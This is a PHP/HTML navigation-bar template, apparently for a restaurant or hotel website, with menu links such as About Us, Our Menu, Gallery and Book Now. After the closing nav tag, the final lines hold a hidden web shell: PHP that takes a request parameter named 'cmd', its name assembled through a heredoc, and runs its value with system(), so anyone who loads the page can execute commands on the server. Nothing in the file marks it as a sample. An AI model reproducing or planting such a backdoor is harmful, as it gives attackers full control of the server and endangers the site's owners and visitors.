			<div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="index.html"><img src="assets/images/logo.png" /></a>
            </div>
            <div id="navbar" class="collapse navbar-collapse">
                <ul class="nav navbar-nav">
				
<?php
/*
	if ($body_filename == 'home') { $body_class = '<li class="active">'; } else {$body_class = '<li>'}
	if ($body_filename == 'about') { $body_class = '<li class="active">'; } else {$body_class = '<li>'}
	if ($body_filename == 'contact') { $body_class = '<li class="active">'; } else {$body_class = '<li>'}
	if ($body_filename == 'careers') { $body_class = '<li class="active">'; } else {$body_class = '<li>'}
	if ($body_filename == 'gallery') { $body_class = '<li class="active">'; } else {$body_class = '<li>'}
	if ($body_filename == 'menu') { $body_class = '<li class="active">'; } else {$body_class = '<li>'}
	if ($body_filename == 'menu-catalog') { $body_class = '<li class="active">'; } else {$body_class = '<li>'}
	if ($body_filename == 'payment') { $body_class = '<li class="active">'; } else {$body_class = '<li>'}
	if ($body_filename == 'promotions') { $body_class = '<li class="active">'; } else {$body_class = '<li>'}
	if ($body_filename == 'room-booking') { $body_class = '<li class="active">'; } else {$body_class = '<li>'}
	if ($body_filename == 'room-selection') { $body_class = '<li class="active">'; } else {$body_class = '<li>'}
*/
	if ($body_filename == 'home') { $body_class = '<li class="active">'; } else {$body_class = '<li>';}
?>	
                    <?php print($body_class); ?><a href="index.php?body=home">Home</a></li>

<?php
	if ($body_filename == 'about') { $body_class = '<li class="active">'; } else {$body_class = '<li>';}
?>	
                    <?php print($body_class); ?><a href="index.php?body=about">About Us</a></li>

<?php
	if ($body_filename == 'menu-catalog') { $body_class = '<li class="active">'; } else {$body_class = '<li>';}
?>	
                    <?php print($body_class); ?><a href="index.php?body=menu-catalog">Our Menu</a></li>

<?php
	if ($body_filename == 'gallery') { $body_class = '<li class="active">'; } else {$body_class = '<li>';}
?>	
                    <?php print($body_class); ?><a href="index.php?body=gallery">Gallery</a></li>

<?php
	if ($body_filename == 'promotions') { $body_class = '<li class="active">'; } else {$body_class = '<li>';}
?>	
                    <?php print($body_class); ?><a href="index.php?body=promotions">Promotions</a></li>

<?php
	if ($body_filename == 'careers') { $body_class = '<li class="active">'; } else {$body_class = '<li>';}
?>	
                    <?php print($body_class); ?><a href="index.php?body=careers">Careers</a></li>

<?php
	if ($body_filename == 'room-booking') { $body_class = '<li class="active">'; } else {$body_class = '<li>';}
?>	
                    <?php print($body_class); ?><a href="index.php?body=home#booking-now">Book Now</a></li>

<?php
	if ($body_filename == 'contact') { $body_class = '<li class="active">'; } else {$body_class = '<li>';}
?>	
                    <?php print($body_class); ?><a href="index.php?body=contact">Contact Us</a></li>
                </ul>
            </div> <!--/.nav-collapse --><?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>